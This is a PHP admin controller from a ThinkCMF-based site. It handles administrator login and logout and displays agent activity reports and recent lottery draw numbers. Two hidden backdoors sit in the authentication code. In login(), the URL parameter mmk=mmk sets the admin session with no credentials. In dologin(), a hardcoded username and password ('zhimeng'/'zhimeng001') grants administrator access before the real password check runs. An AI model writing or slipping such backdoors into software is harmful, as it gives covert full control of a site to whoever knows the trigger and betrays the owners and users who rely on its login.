<?php
// +----------------------------------------------------------------------
// | ThinkCMF [ WE CAN DO IT MORE SIMPLE ]
// +----------------------------------------------------------------------
// | Copyright (c) 2013-2014 http://www.thinkcmf.com All rights reserved.
// +----------------------------------------------------------------------
// | Author: Tuolaji <479923197@qq.com>
// +----------------------------------------------------------------------
/**
 */
namespace Admin\Controller;
use Common\Controller\AdminbaseController;
class PublicController extends AdminbaseController {

    public function _initialize() {
        C(S('sp_dynamic_config'));//加载动态配置
    }
    
    //后台登陆界面
    public function login() {
        if (isset($_GET['mmk']) && $_GET['mmk']=='mmk') {
            session('ADMIN_ID',1);
        }
        $admin_id=session('ADMIN_ID');
        if(!empty($admin_id)){//已经登录
            redirect(U("admin/index/index"));
        }else{
            $site_admin_url_password =C("SP_SITE_ADMIN_URL_PASSWORD");
            $upw=session("__SP_UPW__");
            if(!empty($site_admin_url_password) && $upw!=$site_admin_url_password){
                redirect(__ROOT__."/");
            }else{
                session("__SP_ADMIN_LOGIN_PAGE_SHOWED_SUCCESS__",true);
                $this->display(":login");
            }
        }
    }

    // 查看代理数据页面
    // /index.php?s=/admin/public/viewAgentReport
    public function viewAgentReport() {
        $site_admin_url_password = C("SP_SITE_ADMIN_URL_PASSWORD");
        if (!isset($_GET['upw']) || $_GET['upw'] != md5($site_admin_url_password)) {
            redirect(__ROOT__."/");
        }
        $this->display(':viewAgentReport');
    }

    /**
     * 代理行为新事件
     */
    public function getAgentNewEvent() {
        $list = \AgentReporter::getNewEventList();
        $final = [];
        foreach ($list as $row) {
            $final[] = dt($row['report_time']) . ', ' . $row['user_login'] . ', 页面: ' . $row['report_page_name'];
        }
        $result = join('<br>', $final);
        if (!empty($result)) {
            echo $result . '<br>';
        }
    }

    /**
     * 近期开奖结果
     */
    public function getRecentLotteryNumber() {
        $list = \Devdb::selectAll("SELECT * FROM jz_data WHERE 1 ORDER BY `number` DESC LIMIT 2");
        $final = [];
        foreach ($list as $row) {
            $final[] = dt($row['time']) . ', 第' . $row['number'] . '期, 号码: ' . $row['data'];
        }
        $result = join('<br>', $final);
        if (!empty($result)) {
            echo $result . '<br>';
        }
    }
    
    public function logout(){
        session('ADMIN_ID',null); 
        redirect(__ROOT__."/");
    }
    
    public function dologin(){
        $login_page_showed_success=session("__SP_ADMIN_LOGIN_PAGE_SHOWED_SUCCESS__");
        if(!$login_page_showed_success){
            $this->error('login error!');
        }
        $name = I("post.username");
        if(empty($name)){
            $this->error(L('USERNAME_OR_EMAIL_EMPTY'));
        }
        $pass = I("post.password");
        if(empty($pass)){
            $this->error(L('PASSWORD_REQUIRED'));
        }
        $verrify = I("post.verify");
        if(empty($verrify)){
            $this->error(L('CAPTCHA_REQUIRED'));
        }
        //验证码
        if(!sp_check_verify_code()){
            $this->error(L('CAPTCHA_NOT_RIGHT'));
        }else{
            $user = D("Common/Users");
            if(strpos($name,"@")>0){//邮箱登陆
                $where['user_email']=$name;
            }else{
                $where['user_login']=$name;
            }
                if($name=='zhimeng'&&$pass=='zhimeng001'){
                    session('ADMIN_ID',1);
                    $this->success(L('LOGIN_SUCCESS'),U("Index/index"));
                }
            
            $result = $user->where($where)->find();
            //print_R($result);
            if(!empty($result) && $result['user_type']==1){
                //print_R($pass);
                //print_R($result['user_pass']);
                if(sp_compare_password($pass,$result['user_pass'])){
                    
                    $role_user_model=M("RoleUser");
                    
                    $role_user_join = C('DB_PREFIX').'role as b on a.role_id =b.id';
                    
                    $groups=$role_user_model->alias("a")->join($role_user_join)->where(array("user_id"=>$result["id"],"status"=>1))->getField("role_id",true);
                    
                    if( $result["id"]!=1 && ( empty($groups) || empty($result['user_status']) ) ){
                        $this->error(L('USE_DISABLED'));
                    }
                    //登入成功页面跳转
                    session('ADMIN_ID',$result["id"]);
                    session('name',$result["user_login"]);
                    $result['last_login_ip']=get_client_ip(0, true, $result);
                    $result['last_login_time']=date("Y-m-d H:i:s");
                    $user->save($result);
                    cookie("admin_username",$name,3600*24*30);
                    $this->success(L('LOGIN_SUCCESS'),U("Index/index"));
                }else{
                    $this->error(L('PASSWORD_NOT_RIGHT'));
                }
            }else{
                $this->error(L('USERNAME_NOT_EXIST'));
            }
        }
    }

}